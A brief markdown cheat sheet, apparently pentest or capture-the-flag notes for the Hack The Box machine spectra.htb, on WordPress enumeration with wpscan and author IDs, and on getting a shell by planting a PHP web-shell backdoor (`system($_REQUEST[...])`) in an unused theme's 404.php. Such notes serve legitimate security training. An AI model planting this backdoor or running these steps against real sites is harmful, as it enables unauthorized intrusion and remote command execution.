## Tools
```bash
wpscan --url http://spectra.htb/main/ --plugins-detection aggressive -e ap -o wpscan.out
```

## Manual
- Enumerate authors `http://www.wp.com?author=1` by incrementing the auther id
- Enumerate usernames from comments and post blogs


## Getting Shell From Admin Pannel
### Via Themes
- Log in to `wp-admin` 
- Edit any nonactive theme. Add a backdoor at the beginning of any non-used file such as `404.php`
```php
<?php system($_REQUEST["Hello"]); ?>
```
- Navigate to the theme `http://spectra.htb/main/wp-content/themes/themename/404.php?Hello=whoami`

